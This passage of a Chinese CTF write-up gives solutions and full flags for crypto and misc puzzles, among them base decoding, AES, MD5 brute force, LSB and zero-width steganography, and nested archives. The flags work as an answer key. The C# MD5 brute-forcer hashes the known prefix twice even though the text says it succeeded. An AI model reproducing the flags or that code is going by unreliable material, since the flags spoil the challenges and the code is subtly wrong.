X6*L69IBB.DP3DF3D4%E1CA9X68LEY%6I$EI7BV.C9JCP2D*-AV8E DB.OCYB7SB89IA8B6I7BUN9SZ9KNAQN8:F6BZA0Z8YY9XG8L7AGJBTTA.3E667S2E03E-*8D4FWM6EH8EI9WY86QD*-C%OA.69-6AS6AM09-H9J2D307CB8Y8EA/EAIBHUA8AF:A8*PC74ED67$G6IUC.M9/7BBJB6EDW8EBLE6H6X/E*9F9KC%T9WT9YJC*A8T*6.N9* C8Y80C81DCH2B/DB$DBHH8 N81C8HJCG7A1O91$DW+9PY9UOCX DJ+A4AFKN8P$EVED%Y87WE:M8TB8EAF3Z8$Y9.8F6I9%.C$6BIUC22DZ$DPVCX$DZH80JB.ZAB6A0S67%EOF6 6B5PC52B /E9Y8:Y99$C-PDJIA X8$OAL.CQUCGJBG*8CC8B79*9EA4F0M6*+8GFEW.CS+97Y6-FF3VEQ7A67BDB8JJC/6AE7A7JDF9FFDCAJD1EBAKC4QEQ578+9F$D.2E+M95LE0T8K3FWICS2E5UCZ.CBPDZW6Y09TI9WX8P3FRTATQEMUCHVE4H6HC8LI99JBPEERDC4R6OJB8LE.$EQ+9-OCR DCIBWJEVJEFB6/ED+T9$2DQJD0T9IZA4O9NEDKECSB7ENA*IB6DBW47EIA%+8F$D-L6PZ9$S8GDC0B7CFEW E279Q074S8TN9JKE-090I8+2DPFEHS8XDCQCB0LE0G67IBJ-AL.CYS8E3DI-9K*6S.C5JD87B+B7F%6LOC:A62LESI96UCSWE X67JB49DA-AGH8YVE1$D9LFEVC5 CJ+A+:6M+A+%6P1
```

解码后又得到了这个

```
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
```



此处开始尝试用basecrack省点事了

![All in base](https://nssctf.wdf.ink/img/zack/All_in_base.jpg)

然后动用了我最极限的搜索能力终于找到一个工具 ![basee](https://nssctf.wdf.ink/img/zack/basee.jpg)能解开这个

![All in base_flag](https://nssctf.wdf.ink/img/zack/All_in_base_flag.jpg)

（题出的很好，孩子很喜欢，百草味的性能很好，已经在学编程了，只不过麦丽素的日语课有点难，电动牙刷很好吃，原画插画超棒的，化妆品抹在显卡上很滋润，三只松鼠去污能力强，麦片泡耳机很舒爽，螺蛳粉用来拧螺丝真的严丝合缝，敏感肌括约肌技嘉也能适应，联想的蓝牙支付很方便，二维码配饭很香，理财产品已经让我瘦了十斤了会接着用的，手机的味道也很酱香，交友软件也不错养殖教程都很全面，建模出来的小姐姐运行速度很快没有卡顿很流畅，总之没有下次了）



## 4.Welcome to Modern Cryptography

随便找到一个RSA解密网站

![Welcome to...](https://nssctf.wdf.ink/img/zack/Welcome_to....jpg)



## 5.Sign

先观察密码

```
BEGIN KEYBASE SALTPACK SIGNED MESSAGE. kXR7VktZdyH7rvq v5weRa0zkYz2HcG 0ib8wufDr9Ehs3g 7IrA2TeYweQBqu5 rvbta3003UAuJWC wEK8SvoQqcYEHhK 8RqPvHbeSSUYmnG Y5vhz6AGYcMwcVn nrJq4FLfAD3IGQW NndngFmAhmxV47o mI9tEawz0RxA571 gQVz0BxZXTkwlBl BIMxq2Rj4MkkEcN rmB37Nd5qKhSy45 WPQwe25QsrEHa3F ud2mbgHHsUMV6LZ Nd01d. END KEYBASE SALTPACK SIGNED MESSAGE.
```

开头和结尾很特殊，丢到某度搜索看看

![Sign_start](https://nssctf.wdf.ink/img/zack/Sign_start.jpg)

基本上结果都指向了一个：**keybase.io**

注册一个账号，下载app，安装，解密

![sign_flag](https://nssctf.wdf.ink/img/zack/sign_flag.jpg)





## 6.Matrix

参考百度经验

```
https://jingyan.baidu.com/article/22a299b52d43c5df19376aaf.html
```

```python
import numpy as np
x = np.array([
    [9, 7, 5, 6, 0, 8, 9, 3, 1, 6, 7, 7, 6, 7, 9, 7, 9, 4, 2, 7],
    [6, 8, 9, 0, 4, 1, 7, 1, 9, 6, 4, 0, 5, 0, 9, 9, 3, 7, 8, 1],
    [9, 1, 7, 8, 2, 8, 3, 8, 6, 1, 2, 4, 8, 7, 0, 5, 3, 8, 6, 2],
    [6, 0, 2, 1, 9, 8, 3, 5, 0, 3, 7, 3, 7, 8, 5, 9, 5, 2, 6, 5],
    [8, 5, 7, 1, 7, 7, 8, 9, 9, 9, 3, 2, 4, 1, 5, 7, 6, 7, 2, 9],
    [2, 1, 7, 8, 5, 1, 0, 2, 2, 4, 4, 6, 0, 0, 7, 3, 7, 6, 0, 1],
    [2, 4, 7, 8, 0, 5, 8, 0, 1, 9, 1, 3, 4, 7, 7, 5, 4, 8, 9, 3],
    [6, 5, 5, 1, 9, 8, 9, 3, 7, 2, 4, 3, 6, 7, 2, 1, 6, 5, 8, 8],
    [5, 1, 6, 4, 1, 1, 1, 8, 5, 5, 2, 1, 3, 7, 0, 8, 7, 1, 0, 3],
    [8, 2, 6, 4, 5, 8, 8, 6, 6, 0, 2, 7, 6, 3, 7, 9, 5, 2, 4, 3],
    [5, 4, 0, 2, 2, 5, 6, 0, 3, 3, 3, 0, 4, 9, 5, 6, 9, 7, 7, 6],
    [6, 0, 4, 2, 9, 9, 9, 4, 5, 4, 8, 4, 5, 9, 7, 7, 2, 5, 9, 4],
    [6, 2, 8, 3, 3, 1, 4, 0, 7, 4, 9, 6, 5, 6, 3, 4, 0, 4, 7, 6],
    [8, 4, 4, 7, 6, 2, 3, 4, 9, 2, 0, 3, 1, 1, 2, 7, 2, 6, 8, 6],
    [8, 2, 7, 3, 2, 3, 9, 6, 4, 2, 6, 3, 8, 3, 5, 0, 0, 2, 5, 3],
    [4, 7, 8, 6, 0, 0, 2, 8, 1, 1, 9, 6, 6, 8, 1, 1, 0, 0, 2, 6],
    [5, 0, 2, 8, 9, 7, 6, 4, 9, 5, 8, 4, 5, 2, 9, 0, 9, 3, 0, 3],
    [3, 1, 6, 6, 6, 1, 7, 2, 8, 3, 0, 0, 4, 9, 4, 6, 7, 9, 0, 6],
    [1, 5, 4, 0, 6, 2, 0, 0, 6, 8, 2, 0, 6, 9, 2, 6, 7, 6, 9, 8],
    [7, 8, 7, 6, 7, 3, 8, 8, 0, 7, 5, 8, 6, 2, 4, 3, 4, 2, 3, 1]
])

print(int(np.linalg.det(x)))
```

运行，得到flag

![matrix](https://nssctf.wdf.ink/img/zack/matrix.jpg)



## 7.AES

先看代码 

```python
import base64
from Crypto.Cipher import AES
from flag import getflag
iv = '1229002635654321'
key = 'nssctfneedcrypto'
data = getflag()

def pad(data):
    pad_data = data
    for i in range(0, 16 - len(data)):
        pad_data = pad_data + ' '
    return pad_data

def AES_en(key, data):
    if len(data) < 16:
        data = pad(data)
    AES_obj = AES.new(key.encode("utf-8"), AES.MODE_CBC, iv.encode("utf-8"))
    AES_en_str = AES_obj.encrypt(data.encode("utf-8"))
    AES_en_str = base64.b64encode(AES_en_str)
    AES_en_str = AES_en_str.decode("utf-8")
    return AES_en_str

data = AES_en(key, data)
print(data)
#data=862EoKZMO3sqpNlzyvIW5G/8MFeAI/zgGXcgi5eNOL8=
```

找个工具，解码就行。

![AES_FLAG](https://nssctf.wdf.ink/img/zack/AES_FLAG.jpg)



## 8.爆破MD5

先看代码

```python
data='Boom_MD5****'
flag=MD5(data)
print(flag)
#0618ac93d4631df725bceea74d0*****
```

用C#写了个小程序来爆破MD5

```c#
using System.Diagnostics;
using System.Security.Cryptography;
using System.Text;


string str = "Boom_MD5";
string oringinMD5 = "0618ac";
Stopwatch sw = Stopwatch.StartNew();
TimeSpan ts = new TimeSpan();
sw.Start();
start();
sw.Stop();
ts = sw.Elapsed;
Console.WriteLine("{0}ms calculated in total.", ts.TotalMilliseconds);
 
static string EncryptByMD5(string text)
{

    var md5 = MD5.Create();
    var bs = md5.ComputeHash(Encoding.UTF8.GetBytes(text));
    var sb = new StringBuilder();
    foreach (byte b in bs)
    {
        sb.Append(b.ToString("x2"));
    }
    return sb.ToString();
}

void start()
{
    //[!-~] = [33-126]
    for (int a = 33; a < 126; a++)
    {
        for (int b = 33; b < 126; b++)
        {
            for (int c = 33; c < 126; c++)
            {
                for (int d = 33; d < 126; d++)
                {
                    string data = str + (char)a + (char)b + (char)c + (char)d;
                    string md5 = EncryptByMD5(str + data);
                    
                    Console.WriteLine(str + data + " = " + md5);
                    if (md5.StartsWith(oringinMD5))
                    {
                        Console.WriteLine("Done!");
                        return;
                    }
                }
            }
        }
    }
}

```

然后耐心等上半个小时左右，去做点别的题，吃点东西，打把游戏之类的，然后回来就能看到flag爆破出来了

![MD5_flag](https://nssctf.wdf.ink/img/zack/MD5_flag.jpg)

```
data = Boom_MD5CU'I
md5 = 0618acc7b7e486942373fe633787da4a
flag = NSSCTF{0618acc7b7e486942373fe633787da4a}
```



## 9.Caesar?Ceaasr!

题目:

```
AP{07-p7q6-nr93FGn2r254-7q18q}FSq8no-n2qp7r5
```

看着有点像是flag的组成，但是位置全飘了，怀疑是栅栏，于是跑了一遍

![caesar？ceaasr！栅栏](https://nssctf.wdf.ink/img/zack/caesar？ceaasr！栅栏.jpg)

跑到3的时候就出结果了（学长好温柔...我哭死...）

![caesar？ceaasr！凯撒](https://nssctf.wdf.ink/img/zack/caesar？ceaasr！凯撒.jpg)

然后凯撒解密，得到flag.



# MISC

## 1.Capture!

先尝试修改一下图片高度

![Capture_height_orin](https://nssctf.wdf.ink/img/zack/Capture_height_orin.jpg)

改成任意一个较大的值![Capture_height_fix](https://nssctf.wdf.ink/img/zack/Capture_height_fix.jpg)

保存，打开图片果然发现了猫腻

![Capture_part_1](https://nssctf.wdf.ink/img/zack/Capture_part_1.jpg)

解码后得到了一部分的flag

```
NSSCTF{3e382494-3363-
```

还有一部分其他地方是看不出来了，有理由怀疑是LSB隐写。

这里用的**zsteg**，这东西非常无脑，可比**StegSolve**好使多了

执行命令

```
zsteg Capture!.png -a
```

![Capture_part_2](https://nssctf.wdf.ink/img/zack/Capture_part_2.jpg)

发现一行很像Base64的东西，先拉下来再说。

```
=0nMwADMyEzYhJDNyATLxYjMh1CZlFTM=
```

解不出来，观察到加上前后都有**=**，猜测是不是字符串顺序是颠倒的，于是调整一下

```
MTFlZC1hMjYxLTAyNDJhYzEyMDAwMn0=
```

解码，得到Part 2

```
11ed-a261-0242ac120002}
```

Part 1 + Part 2得到flag

```
NSSCTF{3e382494-3363-11ed-a261-0242ac120002}
```



## 2.Coffee Please

要知道，xlsx/docx/pptx本质上都是压缩包

解压过后，挨个找还是找得出来的。

第一段:

![Coffee_excel](https://nssctf.wdf.ink/img/zack/Coffee_excel.jpg)

![Coffee_p1](https://nssctf.wdf.ink/img/zack/Coffee_p1.jpg)

第二段

![Coffee_word](https://nssctf.wdf.ink/img/zack/Coffee_word.jpg)

![Coffee_p2](https://nssctf.wdf.ink/img/zack/Coffee_p2.jpg)

第三段

![Coffee_ppt](https://nssctf.wdf.ink/img/zack/Coffee_ppt.jpg)

![Coffee_p3](https://nssctf.wdf.ink/img/zack/Coffee_p3.jpg)

全部拼在一起，得到flag

```
NSSCTF{8ff8a53a-9378-4e78-b54a-ef86e8c84432}
```



## 3.Convert Something

首先是，试了一下解码前几行，发现一个问题

```
源文件:
Q1RGc0==
YXJl
b25l
b2b=
bXm=
ZmF2b3JpdGV=
aG9iYmllcy5=
...
解码:
CTFs
are
one
of
my
favorite
hobbies.
再次编码:
Q1RGcw==
YXJl
b25l
b2Y=
bXk=
ZmF2b3JpdGU=
aG9iYmllcy4=
```

发现了吗？将原文的编码解码后，再按照标准编码，和原编码并不一致。

于是猜测是**base64隐写**

网上随便抄一组base64隐写解码的代码

```python
# py2脚本：

def get_base64_diff_value(s1, s2):
    base64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    res = 0
    for i in xrange(len(s2)):
        if s1[i] != s2[i]:
            return abs(base64chars.index(s1[i]) - base64chars.index(s2[i]))
    return res


def solve_stego():
    with open('Conver.txt', 'rb') as f:
        file_lines = f.readlines()
        bin_str = ''
        for line in file_lines:
            steg_line = line.replace('\n', '')
            norm_line = line.replace('\n', '').decode('base64').encode('base64').replace('\n', '')
            diff = get_base64_diff_value(steg_line, norm_line)
            print(diff)
            pads_num = steg_line.count('=')
            if diff:
                bin_str += bin(diff)[2:].zfill(pads_num * 2)
            else:
                bin_str += '0' * pads_num * 2
            print(goflag(bin_str))


def goflag(bin_str):
    res_str = ''
    for i in xrange(0, len(bin_str), 8):
        res_str += chr(int(bin_str[i:i + 8], 2))
    return res_str

if __name__ == '__main__':
    solve_stego()
```

运行，得到第一段flag

```
NSSCTF{e16bc777-0d4a-4b74
```

然后用vsc打开的时候，发现第285行出现了一些奇怪的字符，猜测是零宽字符

![Conver_诡异](https://nssctf.wdf.ink/img/zack/Conver_诡异.jpg)

然后经过高强度搜索，找到了一个零宽字符解码的网站（出题人也是用的这个网站出的题OwO）

```
https://yuanfux.github.io/zero-width-web/
```

![Conver_flag2](https://nssctf.wdf.ink/img/zack/Conver_flag2.jpg)

转换，得到第二段flag

```
-92b4-404bc0320da4}
```

最终flag为

```
NSSCTF{e16bc777-0d4a-4b74-92b4-404bc0320da4}
```

顺带无聊完整解码了一下原文。

```
CTFs are one of my favorite hobbies. I love the feeling of solving a particularly difficult task and seeing all the puzzle pieces click together. I'd like this post to serve as an introduction to CTF for those in the dev.to community that may not know what it is. So what is CTF? CTF (Capture The Flag) is a kind of information security competition that challenges contestants to solve a variety of tasks ranging from a scavenger hunt on wikipedia to basic xrogramming exercises, to hacking your way into a server to steal data. In these challenges, the contestant is usually asked to find a specific piece of text that may be hidden on the server or behind a webpage. This goal is called the flag, hence the name! Like many competitions, the skill level for CTFs varies between the events. Some are targeted towards professionals with experience operating on cyber security teams. These typically offer a large cash reward and can be held at a specific physical location. Other events target the high school and college student range, sometimes offering monetary support for education to those that place highly in the competition! To summarize, Jeopardy style CTFs provide a list of challenges and award points to individuals or teams that complete the challenges, groups with the most points wins. Attack/Defense style CTFs focus on either attacking an opponent's servers or defending one's own. These CTFs are typically aimed at those with more experience and are conducted at a specific physical location. CTFs can be played as an individual or in teams so feel free to get your friends onboard! I'd like to stress that CTFs are available to everyone. Many challenges do not require programming knowledge and are simply a matter of problem solving and creative thinking.
```



## 4.Coding In Time

直接丢进ps里

![coding in time_start](https://nssctf.wdf.ink/img/zack/coding_in_time_start.jpg)

发现图片刚好9帧，每一帧都不一样，说明就是一张二维码被拆成了9份，那就先把他合并好

![coding in time_part_1](https://nssctf.wdf.ink/img/zack/coding_in_time_part_1.jpg)

扫描结果如下

```
NSSCTF{114f75b5-ef1c-4ece-b062-8852
```

再结合题目**Coding in time**的暗示，发现每一帧的时间都不一样，大胆猜测，这是**ascii**码

![coding in time_part_2](https://nssctf.wdf.ink/img/zack/coding_in_time_part_2.jpg)

这里用c++转一下

```c++
#include <iostream>

using namespace std;
int main(){
    char time[] = {99, 102, 98, 100, 100, 101, 55, 102, 125};
    for(int i = 0; i < 9; ++i){ cout << time[i]; }
}

```

得到第二段flag

![coding in time_part_2_flag](https://nssctf.wdf.ink/img/zack/coding_in_time_part_2_flag.jpg)

```
cfbdde7f}
```

最终flag为

```
NSSCTF{114f75b5-ef1c-4ece-b062-8852cfbdde7f}
```



## 5.Cover Removed

打开后，全选，发现图片下面还有点文字

![Convert_Something_part1](https://nssctf.wdf.ink/img/zack/Convert_Something_part1.jpg)

复制出来...半截flag

```
NSSCTF{c024c35f-7358
```

然后百度搜到了，pdf一些常见的隐写手段，最终找到一个叫做wbStego4open的工具，可以实现这种操作

![Cover_part2](https://nssctf.wdf.ink/img/zack/Cover_part2.jpg)

解码后的结果如下

```
-46e2-b330-5ff837a3f9ad}
```

最终flag

```
NSSCTF{c024c35f-7358-46e2-b330-5ff837a3f9ad}
```



## 6.Continue

用C#写个程序一直解压到出结果就行

```c#
using System.Diagnostics;
using System.Text;
using SharpCompress.Readers;
using ReaderOptions = SharpCompress.Readers.ReaderOptions;


Stopwatch sw = Stopwatch.StartNew();
TimeSpan ts = new TimeSpan();
sw.Start();
string filedir = "D:\\SWPU NSS新生赛 2022\\misc\\Continue\\";
string movedir = "D:\\SWPU NSS新生赛 2022\\misc\\Continue\\Continue\\";
string filename = "Continue.zip";
DirectoryInfo dir = new DirectoryInfo(filedir);


static bool DeCompressionFile(string zipPath, string dirPath, string password = "")
{
    if (!File.Exists(zipPath))
    {
        return false;
    }
    Directory.CreateDirectory(dirPath);
    try
    {
        using (Stream stream = File.OpenRead(zipPath))
        {
            var option = new ReaderOptions()
            {
                ArchiveEncoding = new SharpCompress.Common.ArchiveEncoding()
                {
                    Default = Encoding.UTF8
                }
            };
            if (!string.IsNullOrWhiteSpace(password))
            {
                option.Password = password;
            }

            var reader = ReaderFactory.Open(stream, option);
            while (reader.MoveToNextEntry())
            {
                if (reader.Entry.IsDirectory)
                {
                    Directory.CreateDirectory(Path.Combine(dirPath, reader.Entry.Key));
                }
                else
                {
                    //创建父级目录，防止Entry文件,解压时由于目录不存在报异常
                    var file = Path.Combine(dirPath, reader.Entry.Key);
                    Directory.CreateDirectory(Path.GetDirectoryName(file));
                    reader.WriteEntryToFile(file);
                }
            }
        }
        return true;
    }
    catch (Exception ex)
    {
        throw ex;
        return false;
    }
}

while (filename.EndsWith(".zip"))
{
    Console.WriteLine("文件路径：" + filedir + filename + "\n");
    DeCompressionFile(filedir + filename, filedir, filename.Replace(".zip", ""));
    
    //移动到指定文件夹，避免再次遍历时重复解压
    File.Move(filedir + filename, movedir + filename);
    File.Delete(filedir + filename);
    
    var list = dir.GetFiles(".", SearchOption.AllDirectories);
    if (list.Length == 0) { Console.WriteLine("已完成"); break; }
    
    filename = list[0].FullName.Replace(filedir, "");
    Console.WriteLine("解压后的文件名：" + filename + "\n");
}
sw.Stop();
ts = sw.Elapsed;
Console.WriteLine("运行了{0}ms", ts.TotalMilliseconds);
```

运行结果如下：

![Continue_run](https://nssctf.wdf.ink/img/zack/Continue_run.jpg)

最终flag为

```
NSSCTF{09b43595-8b96-4aa4-a5d2-c327c8e41174}
```



但不得不说是真的牛啊，压缩了2002次

![Continue_ooo](https://nssctf.wdf.ink/img/zack/Continue_ooo.jpg)



